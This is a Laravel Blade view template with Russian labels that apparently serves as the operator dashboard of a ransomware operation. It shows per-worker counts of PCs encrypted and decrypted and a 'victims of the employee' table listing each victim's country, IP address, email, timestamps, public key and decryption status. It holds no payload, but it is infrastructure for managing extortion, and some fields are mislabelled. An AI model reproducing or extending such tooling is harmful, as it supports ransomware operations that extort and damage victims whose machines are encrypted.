@extends('layouts.layout')

@section('content')

    <div class="row">
        <div class="col-12">
            <div class="project-list">
                <div class="project-list-title">Статистика работника: {{ $worker->email }}</div>

                <div class="project-item">
                    <div class="project-item-user">
                        <div class="user-avatar"><img src="/assets/img/avatar.jpg" alt="avatar"></div>
                        <div class="user-info"><span class="name">{{ $worker->email }}</span><span class="position description">Работник</span></div>
                    </div>
                    <div class="project-item-title"><span class="name">Зашифрованно сегодня</span><span class="description">{{ $worker->encrypt_today }}</span></div>
                    <div class="project-item-state"><span class="name">Зашифрованно за все время</span><span class="description">{{ $worker->encrypt_all_time }}</span></div>
                    <div class="project-item-state"><span class="name">Расшифрованно сегодня</span><span class="description">{{ $worker->decrypt_today }}</span></div>
                </div>
            </div>
        </div>

    </div>

    <div class="project-list">
        <div class="project-list-title">Зашифрованно ПК</div>
    </div>

    <div class="row">
        <div class="col-md-6 col-lg-3">
            <div class="widget widget-tile">
                <div id="spark1" class="chart sparkline">0,5,3,7,5,10,3,6,5,{{ $worker->encrypt_today }}</div>
                <div class="data-info">
                    <div class="desc">За сегодня</div>
                    <div class="value"><span class="indicator indicator-equal s7-angle-right"></span><span class="number">{{ $worker->encrypt_today }}</span></div>
                </div>
            </div>
        </div>
        <div class="col-md-6 col-lg-3">
            <div class="widget widget-tile">
                <div id="spark2" class="chart sparkline">5,8,7,10,9,10,8,6,4,6,8,7,6,8</div>
                <div class="data-info">
                    <div class="desc">За неделю</div>
                    <div class="value"><span class="indicator indicator-positive s7-angle-up"></span><span class="number">{{ $worker->encrypt_week }}</span></div>
                </div>
            </div>
        </div>
        <div class="col-md-6 col-lg-3">
            <div class="widget widget-tile">
                <div id="spark3" class="chart sparkline">2,3,4,5,4,3,2,3,4,5,6,5,4,3,4,5,6,5,4,4,5</div>
                <div class="data-info">
                    <div class="desc">За месяц</div>
                    <div class="value"><span class="indicator indicator-positive s7-angle-up"></span><span class="number">{{ $worker->encrypt_mouth }}</span></div>
                </div>
            </div>
        </div>
        <div class="col-md-6 col-lg-3">
            <div class="widget widget-tile">
                <div id="spark4" class="chart sparkline">2,5,3,7,5,10,3,6,5,7</div>
                <div class="data-info">
                    <div class="desc">За все время</div>
                    <div class="value"><span class="indicator indicator-negative s7-angle-down"></span><span class="number">{{ $worker->encrypt_all_time }}</span></div>
                </div>
            </div>
        </div>
    </div>


    <div class="row">

        <div class="col-sm-12">
            <div class="panel panel-default panel-table">
                <div class="panel-heading">Расшифрованно ПК
                    <div class="tools"><span class="icon s7-cloud-download"></span><span class="icon s7-edit"></span></div>
                </div>
                <div class="panel-body">
                    <table class="table">
                        <thead>
                        <tr>
                            <th>За сегоня</th>
                            <th class="number">За неделю</th>
                            <th class="number">За месяц</th>
                            <th class="number">За все время</th>
                            <th class="actions"></th>
                        </tr>
                        </thead>
                        <tbody>
                        <tr>
                            <td>{{ $worker->encrypt_today }}</td>
                            <td class="number">{{ $worker->decrypt_week }}</td>
                            <td class="number">{{ $worker->decrypt_mouth }}</td>
                            <td class="number">{{ $worker->encrypt_all_time }}</td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <!--Condensed Table-->

    </div>


    <div class="row">
        <!--Hover table-->
        <div class="col-sm-12">
            <div class="panel panel-default panel-table">
                <div class="panel-heading">Жертвы сотрудника
                    <div class="tools"><span class="icon s7-cloud-download"></span><span class="icon s7-edit"></span></div>
                </div>
                <div class="panel-body">
                    <table class="table table-striped table-hover">
                        <thead>
                        <tr>
                            <th>Страна</th>
                            <th>Ip Адресс</th>
                            <th>E-mail</th>
                            <th>Начало</th>
                            <th>Конец</th>
                            <th>Зашифровало</th>
                            <th>Id</th>
                            <th>Публичный ключ</th>
                            <th>Расшифровао ?</th>
                        </tr>
                        </thead>
                        <tbody>
                        @foreach($worker->victims as $victim)
                        <tr>
                            <td class="user-avatar"> <img src="/flags/{{ $victim->flag() }}.svg" alt="{{ $victim->country() }}" data-toggle="tooltip" data-placement="top" data-original-title="{{ $victim->country() }}"></td>
                            <td><a href="https://www.whois.com/whois/{{ $victim->ip }}" target="_blank">{{ $victim->ip }}</a></td>
                            <td>{{ $victim->email }}</td>
                            <td>{{ $victim->begin }}</td>
                            <td>{{ $victim->end }}</td>
                            <td>{{ $victim->encrypt_count }}</td>
                            <td>{{ $victim->id }}</td>
                            <td>{{ $victim->public_key }}</td>
                            <td>{{ $victim->encrypted }}</td>


                        </tr>

                        @endforeach


                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>


@endsection